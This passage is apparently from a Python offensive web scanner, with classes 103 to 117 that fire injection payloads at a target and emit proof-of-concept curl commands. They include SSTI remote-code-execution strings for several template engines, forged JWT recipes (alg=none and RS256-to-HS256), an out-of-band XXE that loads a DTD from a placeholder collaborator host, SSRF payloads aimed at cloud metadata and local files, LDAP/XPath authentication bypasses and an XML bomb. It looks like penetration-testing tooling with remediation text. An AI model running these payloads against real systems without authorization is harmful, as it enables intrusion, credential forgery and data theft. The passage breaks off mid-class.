                        remediation="Normalize requests at reverse proxy layer. Reject conflicting CL+TE headers. Enable HTTP/2 end-to-end."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 103: OAuth State CSRF (SKILL-113) ────────────────────
class OAuthStateCSRF:
    """Detect missing, reused, or guessable OAuth state parameter."""
    NAME = "OAuth State CSRF"
    AUTH_PATHS = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                  "/connect/authorize", "/api/oauth/authorize"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.AUTH_PATHS:
            url = profile.url.rstrip("/") + path
            # No state param
            probe1 = url + "?response_type=code&client_id=test&redirect_uri=http://localhost"
            # Predictable state
            probe2 = url + "?response_type=code&client_id=test&redirect_uri=http://localhost&state=1234"
            for label, probe in [("no_state", probe1), ("weak_state", probe2)]:
                try:
                    r = _fetch(probe, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 302):
                        loc = r.headers.get("location", "")
                        if label == "no_state" and "state=" not in loc and r.status == 302:
                            profile.findings.append(Finding(
                                id="OAUTH-NO-STATE",
                                title="OAuth2 authorization redirects without state parameter",
                                severity="HIGH",
                                cvss=7.4,
                                cwe="CWE-352",
                                description=f"OAuth endpoint {path} redirected to '{loc[:80]}' without state parameter — CSRF attack possible.",
                                poc_curl=f"curl -sk -v '{probe1}' 2>&1 | grep location",
                                category="OAuth",
                                remediation="Generate a cryptographically random state, bind it to the session, and validate it on callback. Use PKCE as additional protection."
                            ))
                        if label == "weak_state" and "state=1234" in loc:
                            profile.findings.append(Finding(
                                id="OAUTH-WEAK-STATE",
                                title="OAuth2 state parameter reflected without validation",
                                severity="MEDIUM",
                                cvss=5.4,
                                cwe="CWE-330",
                                description=f"OAuth endpoint {path} reflected weak state '1234' in redirect — state may not be validated server-side.",
                                poc_curl=f"curl -sk -v '{probe2}' 2>&1 | grep location",
                                category="OAuth",
                                remediation="Validate state on callback: must match a server-side session-bound nonce. Min 128-bit entropy."
                            ))
                except Exception:
                    pass
        return profile

# ── Tool 104: Exposed Debug Endpoints (SKILL-114) ─────────────
class ExposedDebugEndpoints:
    """Find exposed framework debug/profiler/admin endpoints."""
    NAME = "Exposed Debug Endpoints"
    DEBUG_PATHS = [
        "/debug/pprof", "/debug/vars", "/debug/requests",
        "/__debug__/", "/_debug/", "/_profile",
        "/metrics", "/metrics/prometheus",
        "/jolokia", "/jolokia/read",
        "/_ah/admin", "/_ah/mail", "/_ah/warmup",
        "/druid/index.html", "/kibana",
        "/solr/admin", "/solr/admin/info/system",
        "/__admin__", "/__status__", "/__health__",
        "/telescope", "/telescope/requests",
        "/horizon", "/horizon/api/stats",
        "/_profiler/phpstorm", "/?XDEBUG_SESSION_START=1",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.DEBUG_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 403):
                    body = (r.body or b"").decode("utf-8", errors="replace")[:200]
                    sev = "HIGH" if r.status == 200 else "MEDIUM"
                    profile.findings.append(Finding(
                        id=f"DEBUG-EP-{path.replace('/','_')[:20].upper()}",
                        title=f"Debug/profiler endpoint accessible: {path}",
                        severity=sev,
                        cvss=7.5 if sev == "HIGH" else 4.3,
                        cwe="CWE-489",
                        description=f"{url} returned {r.status}. Content: {body[:100]}",
                        poc_curl=f"curl -sk {url}",
                        category="Information Disclosure",
                        remediation="Disable debug endpoints in production. Restrict with network ACL or remove entirely."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 105: Blind OS Command Injection (SKILL-115) ──────────
class BlindCMDInjection:
    """Send time-safe blind OS command injection payloads and detect via response delta."""
    NAME = "Blind CMDi"
    SAFE_PAYLOADS = [
        (";echo ApexHunter123", "ApexHunter123"),
        ("|echo ApexHunter123", "ApexHunter123"),
        ("&&echo ApexHunter123", "ApexHunter123"),
        ("$(echo ApexHunter123)", "ApexHunter123"),
        ("`echo ApexHunter123`", "ApexHunter123"),
    ]
    INJECT_PARAMS = ["name", "host", "ip", "ping", "cmd", "exec", "command",
                     "query", "search", "file", "path", "domain", "url"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.INJECT_PARAMS[:6]:
            for suffix, marker in self.SAFE_PAYLOADS[:3]:
                url = profile.url.rstrip("/") + f"/?{param}=test{suffix}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if marker in body:
                            profile.findings.append(Finding(
                                id="BLIND-CMDI",
                                title=f"Blind OS command injection via parameter '{param}'",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-78",
                                description=f"Parameter '{param}' executed 'echo {marker}' and reflection appeared in response body.",
                                poc_curl=f"curl -sk '{url}'",
                                category="Injection",
                                remediation="Never pass user input to OS shell functions. Use parameterized APIs. Whitelist-validate all shell-bound inputs."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ══════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════
# TOOLS 106-125 — 20 Black Team Skills (Phase 10)
# ══════════════════════════════════════════════════════════════

# ── Tool 106: Log4Shell / JNDI Injection (SKILL-116) ──────────
class Log4ShellScanner:
    """Inject JNDI payloads into headers to detect Log4j RCE (CVE-2021-44228)."""
    NAME = "Log4Shell Scanner"
    # Safe detection payloads — no live LDAP server, only DNS-observable patterns
    JNDI_HEADERS = [
        "User-Agent", "X-Forwarded-For", "X-Api-Version",
        "X-Remote-IP", "X-Remote-Addr", "X-Originating-IP",
        "Referer", "CF-Connecting-IP", "True-Client-IP",
        "Accept-Language", "Authorization",
    ]
    # Uses a non-routable DNS label — change to your Burp Collaborator / interactsh host
    JNDI_PAYLOADS = [
        "${jndi:ldap://log4shell-detect.invalid/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://log4shell-detect.invalid/a}",
        "${${lower:j}ndi:ldap://log4shell-detect.invalid/a}",
        "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4shell-detect.invalid/a}",
        "${jndi:dns://log4shell-detect.invalid/a}",
        "${jndi:rmi://log4shell-detect.invalid/a}",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for hdr in self.JNDI_HEADERS[:5]:
            for pl in self.JNDI_PAYLOADS[:3]:
                try:
                    r = _fetch(profile.url, cfg.ua, cfg.timeout,
                               headers_extra={hdr: pl})
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        # Direct reflection = the server echoed the raw payload (bad sign)
                        if "${jndi:" in body or "log4shell-detect" in body:
                            profile.findings.append(Finding(
                                id="LOG4SHELL-REFLECT",
                                title=f"Log4Shell JNDI payload reflected in response (CVE-2021-44228)",
                                severity="CRITICAL",
                                cvss=10.0,
                                cwe="CWE-917",
                                description=f"Header '{hdr}' with JNDI payload was reflected unprocessed in response body — "
                                            "server may be echoing without lookup. Verify OOB DNS hit with Burp Collaborator.",
                                poc_curl=(
                                    f"curl -sk {profile.url} "
                                    f"-H '{hdr}: ${{jndi:ldap://YOUR_COLLABORATOR/a}}'"
                                ),
                                category="RCE",
                                remediation="Upgrade Log4j to ≥2.17.1. Set log4j2.formatMsgNoLookups=true. Block JNDI lookups at JVM level."
                            ))
                            return profile
                except Exception:
                    pass
        # Always emit an informational PoC for OOB testing
        poc_lines = "\n".join(
            f"curl -sk {profile.url} -H '{h}: ${{jndi:ldap://COLLAB/{i}}}'"
            for i, h in enumerate(self.JNDI_HEADERS[:5]))
        profile.findings.append(Finding(
            id="LOG4SHELL-OOB-POC",
            title="Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-917",
            description=(
                "JNDI payloads were sent in 5 common headers. No server-side reflection "
                "detected passively. Use Burp Collaborator to observe DNS/HTTP callbacks."
            ),
            poc_curl=poc_lines,
            category="RCE",
            remediation="Upgrade Log4j to ≥2.17.1. Remove log4j from all JVM-based services. Block outbound LDAP/RMI."
        ))
        return profile

# ── Tool 107: XPath Injection (SKILL-117) ─────────────────────
class XPathInjection:
    """Detect XPath injection in login and search parameters."""
    NAME = "XPath Injection"
    XPATH_PAYLOADS = [
        ("' or '1'='1", "boolean bypass"),
        ("' or 1=1 or ''='", "boolean bypass 2"),
        ("x' or name()='username' or 'x'='y", "name() extract"),
        ("' or count(/*)>0 or '", "count probe"),
        ("admin' or '1'='1", "auth bypass"),
        ("' or substring(name(/*[1]),1,1)='a' or '", "blind enum"),
    ]
    PARAMS = [("username", "password"), ("user", "pass"),
              ("login", "pwd"), ("email", "password"), ("q", None)]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for (p1, p2) in self.PARAMS[:4]:
            for pl, label in self.XPATH_PAYLOADS[:4]:
                # POST form
                body_data = f"{p1}={pl}&{p2 or 'pass'}=test".encode() if p2 else f"{p1}={pl}".encode()
                try:
                    r = _fetch(profile.url, cfg.ua, cfg.timeout, "POST", body_data,
                               {"Content-Type": "application/x-www-form-urlencoded"})
                    if not r:
                        continue
                    resp_body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    if any(sig in resp_body.lower() for sig in
                           ["xpath", "xmlpath", "unterminated string",
                            "invalid predicate", "namespace"]):
                        profile.findings.append(Finding(
                            id="XPATH-INJECT",
                            title=f"XPath injection via '{p1}' parameter ({label})",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-643",
                            description=f"XPath error keywords appeared in response after injecting '{pl}' into '{p1}'. Possible XPath data store.",
                            poc_curl=(
                                f"curl -sk -X POST {profile.url} "
                                f"-d \"{p1}={pl}&{p2 or 'pass'}=test\""
                            ),
                            category="Injection",
                            remediation="Use parameterized XPath queries. Never concatenate user input into XPath expressions."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 108: LDAP Injection (SKILL-118) ──────────────────────
class LDAPInjection:
    """Detect LDAP injection in authentication and directory search endpoints."""
    NAME = "LDAP Injection"
    LDAP_PAYLOADS = [
        ("*)(uid=*", "wildcard bypass"),
        ("*)(|(uid=*", "OR injection"),
        ("admin)(&(password=x", "AND bypass"),
        ("*))%00", "null byte termination"),
        ("*()|&'", "special chars"),
        ("admin))(|(cn=*", "nested OR"),
    ]
    PARAMS = ["username", "user", "login", "email", "uid", "search", "q", "cn"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        LDAP_ERR = re.compile(
            r'ldap|javax\.naming|NamingException|invalid attribute|'
            r'ldap_search|Bad search filter|Size limit|sizelimit', re.I)
        for param in self.PARAMS[:5]:
            for pl, label in self.LDAP_PAYLOADS[:4]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    resp_body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    if LDAP_ERR.search(resp_body):
                        profile.findings.append(Finding(
                            id="LDAP-INJECT",
                            title=f"LDAP injection via parameter '{param}' ({label})",
                            severity="HIGH",
                            cvss=8.8,
                            cwe="CWE-90",
                            description=f"LDAP error keywords in response for payload '{pl}' on '{param}'. Indicates unsanitized LDAP filter construction.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Escape LDAP special chars: ( ) * \\ NUL. Use LDAP SDK parameterized search filters."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 109: SSI / Edge-Side Include Injection (SKILL-119) ───
class SSIInjection:
    """Detect Server-Side Include and Edge-Side Include injection."""
    NAME = "SSI/ESI Injection"
    SSI_PAYLOADS = [
        "<!--#echo var=\"DATE_LOCAL\" -->",
        "<!--#exec cmd=\"echo ssi-test-apex\" -->",
        "<!--#include virtual=\"/etc/passwd\" -->",
        "<!--#printenv -->",
    ]
    ESI_PAYLOADS = [
        "<esi:include src=\"http://169.254.169.254/\" />",
        "<esi:include src=\"/etc/passwd\" />",
        "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
    ]
    PARAMS = ["name", "message", "comment", "content", "text", "q", "search", "body"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        SSI_MARKERS = ["ssi-test-apex", "root:", "DATE_LOCAL", "SERVER_SOFTWARE",
                       "HTTP_HOST", "DOCUMENT_ROOT"]
        for param in self.PARAMS[:5]:
            for pl in (self.SSI_PAYLOADS + self.ESI_PAYLOADS)[:4]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    for marker in SSI_MARKERS:
                        if marker in body and pl not in body:
                            label = "SSI" if "<!--#" in pl else "ESI"
                            profile.findings.append(Finding(
                                id=f"{label}-INJECT",
                                title=f"{label} injection via '{param}' parameter",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-97",
                                description=f"{label} payload executed: marker '{marker}' appeared in response. Payload: {pl[:60]}",
                                poc_curl=f"curl -sk '{url}'",
                                category="Injection",
                                remediation=f"Disable {label} processing. Never render user input through server-side include engines."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 110: PDF / HTML-to-PDF SSRF (SKILL-120) ─────────────
class PDFGeneratorSSRF:
    """Detect SSRF and file-read via PDF/export generation endpoints."""
    NAME = "PDF Generator SSRF"
    PDF_PATHS = [
        "/api/export/pdf", "/api/pdf", "/pdf", "/export",
        "/api/export", "/print", "/api/print",
        "/api/report/pdf", "/api/generate",
        "/api/screenshot", "/api/render",
    ]
    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "http://localhost/server-status",
        "dict://localhost:11211/stat",
        "gopher://localhost:6379/_INFO%0a",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.PDF_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status not in (200, 400, 405, 422):
                    continue
                # Endpoint exists — generate SSRF PoC
                poc_lines = []
                for pl in self.SSRF_PAYLOADS:
                    for param in ["url", "src", "source", "target", "html", "content"]:
                        poc_lines.append(
                            f"curl -sk -X POST {url} -H 'Content-Type: application/json' "
                            f"-d '{{\"url\":\"{pl}\",\"{param}\":\"{pl}\"}}'"
                        )
                profile.findings.append(Finding(
                    id=f"PDF-SSRF-{path.replace('/','_')[:15].upper()}",
                    title=f"PDF/export generator endpoint exposed: {path}",
                    severity="HIGH",
                    cvss=8.6,
                    cwe="CWE-918",
                    description=(
                        f"PDF/export endpoint {url} responded with HTTP {r.status}. "
                        "These endpoints commonly use headless Chromium or wkhtmltopdf which "
                        "can fetch arbitrary URLs — test for SSRF and local file read."
                    ),
                    poc_curl="\n".join(poc_lines[:3]),
                    category="SSRF",
                    remediation="Sanitize URL inputs to PDF renderers. Block access to internal networks from renderer process. Use a dedicated sandbox."
                ))
            except Exception:
                pass
        return profile

# ── Tool 111: JWT Algorithm Confusion RS256→HS256 (SKILL-121) ─
class JWTAlgorithmConfusion:
    """Forge JWT tokens using RS256→HS256 algorithm confusion attack."""
    NAME = "JWT Algorithm Confusion"
    JWT_HDR_PAT = re.compile(
        r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]*')
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        # Phase 1: locate a JWT in a well-known response
        for path in ["/api/me", "/api/token", "/api/auth/token",
                     "/oauth/token", "/.well-known/openid-configuration"]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                auth_hdr = r.headers.get("authorization", "") + r.headers.get("www-authenticate", "")
                candidate = self.JWT_HDR_PAT.search(body) or self.JWT_HDR_PAT.search(auth_hdr)
                if candidate:
                    token = candidate.group(0)
                    # Decode header to check algorithm
                    import base64 as _b64
                    hdr_b64 = token.split(".")[0]
                    hdr_b64 += "=" * (-len(hdr_b64) % 4)
                    try:
                        hdr = json.loads(_b64.urlsafe_b64decode(hdr_b64).decode())
                    except Exception:
                        hdr = {}
                    alg = hdr.get("alg", "unknown")
                    if alg.startswith("RS") or alg.startswith("ES"):
                        profile.findings.append(Finding(
                            id="JWT-ALG-CONFUSION",
                            title=f"JWT uses asymmetric algorithm ({alg}) — test RS256→HS256 confusion",
                            severity="HIGH",
                            cvss=8.8,
                            cwe="CWE-327",
                            description=(
                                f"JWT with alg={alg} found at {path}. "
                                "Algorithm confusion attack: sign a forged token with HS256 using the server's RSA public key as the HMAC secret. "
                                "If the server trusts both RS256 and HS256, it will verify the forged token using the public key."
                            ),
                            poc_curl=(
                                f"# 1. Fetch public key: curl -sk {profile.url}/.well-known/jwks.json\n"
                                f"# 2. Forge with python-jwt:\n"
                                f"#    python3 -c \"import jwt,base64; pub=open('pub.pem').read(); "
                                f"print(jwt.encode({{'sub':'admin','role':'admin'}}, pub, algorithm='HS256'))\"\n"
                                f"# 3. Send forged token: curl -sk {url} -H 'Authorization: Bearer FORGED'"
                            ),
                            category="Authentication",
                            remediation="Enforce a single allowed algorithm per key. Reject HS256 tokens when using RS256. Use `algorithms=['RS256']` explicitly in JWT verification."
                        ))
                    elif alg == "none":
                        profile.findings.append(Finding(
                            id="JWT-ALG-NONE",
                            title="JWT with alg=none accepted — signature bypass",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-347",
                            description=f"JWT found at {path} with alg=none. Server may accept unsigned tokens.",
                            poc_curl=(
                                f"# Forge unsigned token:\n"
                                f"python3 -c \""
                                f"import base64,json; "
                                f"h=base64.urlsafe_b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode(); "
                                f"p=base64.urlsafe_b64encode(json.dumps({{'sub':'admin','role':'admin'}}).encode()).rstrip(b'=').decode(); "
                                f"print(f'{{h}}.{{p}}.')\""
                            ),
                            category="Authentication",
                            remediation="Reject tokens with alg=none. Whitelist exactly one algorithm per application context."
                        ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 112: Blind XXE via OOB DNS (SKILL-122) ───────────────
class BlindXXEOOB:
    """Generate OOB blind XXE payloads targeting DTD-loading XML parsers."""
    NAME = "Blind XXE OOB"
    XML_ENDPOINTS = [
        "/api/import", "/api/upload", "/api/xml", "/api/parse",
        "/soap", "/ws", "/api/soap", "/api/webhook",
        "/api/feed", "/api/rss", "/api/atom",
        "/api/sitemap.xml",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        XXE_PAYLOADS = [
            # Classic XXE file read
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<root>&xxe;</root>'),
            # OOB DTD load (replace COLLAB with Burp Collaborator)
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://COLLAB/xxe.dtd">%dtd;]>'
             '<root/>'),
            # SVG XXE vector
            ('<svg xmlns="http://www.w3.org/2000/svg">'
             '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<text>&xxe;</text></svg>'),
        ]
        CONTENT_TYPES = [
            "application/xml", "text/xml", "application/atom+xml",
            "application/rss+xml", "image/svg+xml",
        ]
        for path in self.XML_ENDPOINTS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 400, 405, 415, 422):
                    for ct in CONTENT_TYPES[:2]:
                        poc = XXE_PAYLOADS[0]
                        profile.findings.append(Finding(
                            id=f"XXE-OOB-{path.replace('/','_')[:15].upper()}",
                            title=f"XML endpoint exposed — blind XXE OOB payloads generated: {path}",
                            severity="HIGH",
                            cvss=8.6,
                            cwe="CWE-611",
                            description=(
                                f"Endpoint {url} accepts XML ({r.status}). "
                                "Replace COLLAB with your Burp Collaborator host for OOB exfiltration. "
                                "Classic file-read payload also generated."
                            ),
                            poc_curl=(
                                f"curl -sk -X POST {url} -H 'Content-Type: {ct}' "
                                f"--data-binary '{XXE_PAYLOADS[1]}'"
                            ),
                            category="XXE",
                            remediation="Disable external entity processing. Use defusedxml. Set FEATURE_EXTERNAL_GENERAL_ENTITIES=false."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 113: SSTI → RCE Chain (SKILL-123) ───────────────────
class SSTIRCEChain:
    """Test SSTI payloads that escalate to RCE via class hierarchy traversal."""
    NAME = "SSTI RCE Chain"
    # Detection polyglot — safe expression, just evaluates math
    DETECT_PAYLOAD = "${7777+1}{{7777+1}}#{7777+1}*{7777+1}@(7777+1)"
    RCE_PAYLOADS = {
        "Jinja2":    "{{config.__class__.__init__.__globals__['os'].popen('echo APEX_RCE').read()}}",
        "Twig":      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('echo APEX_RCE')}}",
        "FreeMarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo APEX_RCE\")}",
        "Velocity":  "#set($e=\"\")#set($x=$e.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"echo APEX_RCE\".class))",
        "Pebble":    "{% set os = 'java.lang.Runtime' | classLoading %}",
        "Mvel":      "new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"id\"}).getInputStream()).useDelimiter(\"\\\\A\").next()",
    }
    PARAMS = ["name", "template", "query", "message", "subject", "greeting",
              "title", "content", "text", "username", "search"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.PARAMS[:6]:
            url = profile.url.rstrip("/") + f"/?{param}={self.DETECT_PAYLOAD}"
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                if "7778" in body:
                    engine = "Unknown"
                    if "{{7777+1}}" not in body and "7778" in body:
                        engine = "Jinja2/Twig"
                    elif "${7777+1}" not in body and "7778" in body:
                        engine = "FreeMarker/Velocity"
                    profile.findings.append(Finding(
                        id="SSTI-RCE-CHAIN",
                        title=f"SSTI → RCE chain — expression evaluated in '{param}' ({engine})",
                        severity="CRITICAL",
                        cvss=10.0,
                        cwe="CWE-94",
                        description=(
                            f"Math expression 7777+1=7778 evaluated in parameter '{param}'. "
                            f"Detected engine hint: {engine}. "
                            "RCE payload chain provided below — confirm manually."
                        ),
                        poc_curl="\n".join(
                            f"# {eng}: curl -sk '{profile.url}/?{param}={pl}'"
                            for eng, pl in self.RCE_PAYLOADS.items()
                        ),
                        category="RCE",
                        remediation="Use sandboxed template engines. Never pass user input to template rendering functions. Enforce strict mode with no class access."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 114: Cache Poisoning Advanced (SKILL-124) ───────────
class CachePoisoningAdvanced:
    """Detect advanced cache poisoning: fat GET, unkeyed cookies, parameter cloaking."""
    NAME = "Cache Poisoning Advanced"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        tests = [
            # Fat GET: body in GET request
            {
                "label": "fat-GET",
                "method": "GET",
                "body": b"injected=apexpoison",
                "headers": {"Content-Type": "application/x-www-form-urlencoded",
                            "Content-Length": "19"},
            },
            # Unkeyed cookie injection
            {
                "label": "unkeyed-cookie",
                "method": "GET",
                "body": None,
                "headers": {"Cookie": "poison=apexpoison; session=legit"},
            },
            # X-Original-URL cache key normalisation
            {
                "label": "x-original-url",
                "method": "GET",
                "body": None,
                "headers": {"X-Original-URL": "/apexpoison"},
            },
            # Parameter cloaking via semicolons
            {
                "label": "param-cloak",
                "method": "GET",
                "body": None,
                "headers": {},
                "url_suffix": ";apexpoison=1",
            },
        ]
        for test in tests:
            url = profile.url + test.get("url_suffix", "")
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, test["method"],
                           test.get("body"), test.get("headers", {}))
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                cc = r.headers.get("cache-control", "")
                via = r.headers.get("via", "") + r.headers.get("x-cache", "")
                if "apexpoison" in body:
                    profile.findings.append(Finding(
                        id=f"CACHE-POISON-ADV-{test['label'].upper()}",
                        title=f"Advanced cache poisoning — '{test['label']}' reflected in response",
                        severity="HIGH",
                        cvss=8.2,
                        cwe="CWE-345",
                        description=f"Unkeyed input '{test['label']}' was reflected in response body. Cache-Control: {cc}, Via: {via}.",
                        poc_curl=f"curl -sk -X {test['method']} '{url}' " +
                                 " ".join(f"-H '{k}: {v}'" for k,v in test.get("headers",{}).items()),
                        category="Cache",
                        remediation="Ensure all user-controlled inputs are keyed in the cache key or stripped at the CDN edge."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 115: OAuth Token Referer Leakage (SKILL-125) ────────
class OAuthTokenRefererLeak:
    """Detect OAuth access tokens leaking via Referer to third-party resources."""
    NAME = "OAuth Token Referer Leak"
    OAUTH_CALLBACK_PATHS = [
        "/oauth/callback", "/auth/callback", "/oauth2/callback",
        "/api/oauth/callback", "/connect/callback",
        "/auth/redirect", "/oauth/redirect",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.OAUTH_CALLBACK_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url + "?code=test&state=test", cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                loc = r.headers.get("location", "")
                # If callback returns a page that loads third-party resources
                # with a token in the URL, the Referer header will leak the token
                third_party = re.findall(
                    r'src=["\']https?://(?!' + re.escape(profile.host) + r')[^"\']+["\']',
                    body, re.I)
                token_in_url = re.search(
                    r'[?&#](?:access_token|token|code)=[A-Za-z0-9_\-\.]{10,}', loc)
                if third_party and token_in_url:
                    profile.findings.append(Finding(
                        id="OAUTH-REFERER-LEAK",
                        title="OAuth token leaks via Referer to third-party resource",
                        severity="HIGH",
                        cvss=7.4,
                        cwe="CWE-598",
                        description=(
                            f"OAuth callback at {path} places token in URL ({loc[:80]}) "
                            f"then loads third-party resources: {third_party[0][:60]}. "
                            "The browser sends the token-bearing URL as Referer to the third party."
                        ),
                        poc_curl=f"curl -sk -v '{url}?code=test&state=test' 2>&1 | grep -i location",
                        category="OAuth",
                        remediation="Use fragment (#) instead of query string for tokens. Clear token from URL after exchange. Use strict Referrer-Policy: no-referrer."
                    ))
                elif r.status in (200, 302):
                    profile.findings.append(Finding(
                        id=f"OAUTH-CALLBACK-EXPOSED-{path.replace('/','_')[:15].upper()}",
                        title=f"OAuth callback endpoint exposed: {path}",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-598",
                        description=f"OAuth callback {url} responded {r.status}. Manually test for token-in-Referer leakage with third-party resources on the callback page.",
                        poc_curl=f"curl -sk -v '{url}?code=test&state=test' 2>&1 | grep -iE 'location|referer'",
                        category="OAuth",
                        remediation="Audit all resources loaded on the OAuth callback page for third-party origins."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 116: SOAP / XML Injection (SKILL-126) ────────────────
class SOAPXMLInjection:
    """Detect SOAP endpoints and test for XML injection, entity expansion, and schema attacks."""
    NAME = "SOAP/XML Injection"
    SOAP_PATHS = ["/ws", "/soap", "/api/soap", "/service", "/services",
                  "/webservice", "/webservices", "/wsdl", "/api/wsdl",
                  "/?wsdl", "/?WSDL", "/api?wsdl"]
    SOAP_PROBE = b"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <test><![CDATA[<inject/>]]></test>
  </soapenv:Body>
</soapenv:Envelope>"""
    BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SOAP_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 400, 405, 415, 500):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    is_soap = any(k in body.lower() for k in
                                  ["wsdl", "soap", "envelope", "definitions", "porttype"])
                    if not is_soap and r.status not in (200,):
                        continue
                    # Test CDATA injection
                    r2 = _fetch(url, cfg.ua, cfg.timeout, "POST", self.SOAP_PROBE,
                                {"Content-Type": "text/xml; charset=utf-8",
                                 "SOAPAction": '""'})
                    inject_sig = False
                    if r2 and r2.body:
                        b2 = r2.body.decode("utf-8", errors="replace")
                        inject_sig = "<inject" in b2 or "CDATA" in b2
                    profile.findings.append(Finding(
                        id=f"SOAP-INJECT-{path.replace('/','_')[:15].upper()}",
                        title=f"SOAP/XML endpoint exposed: {path}" + (" — CDATA reflected" if inject_sig else ""),
                        severity="HIGH" if inject_sig else "MEDIUM",
                        cvss=8.1 if inject_sig else 5.3,
                        cwe="CWE-91",
                        description=(
                            f"SOAP endpoint {url} responded {r.status}. "
                            + ("CDATA injection reflected in response. " if inject_sig else "")
                            + "Also test for Billion Laughs (XML bomb) and external entity attacks."
                        ),
                        poc_curl=(
                            f"curl -sk -X POST {url} -H 'Content-Type: text/xml' "
                            f"-H 'SOAPAction: \"\"' --data-binary @soap_inject.xml"
                        ),
                        category="Injection",
                        remediation="Disable DTD processing. Validate SOAP schema strictly. Use an XML firewall for SOAP services."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 117: PHP Type Juggling (SKILL-127) ───────────────────
class PHPTypeJuggling:
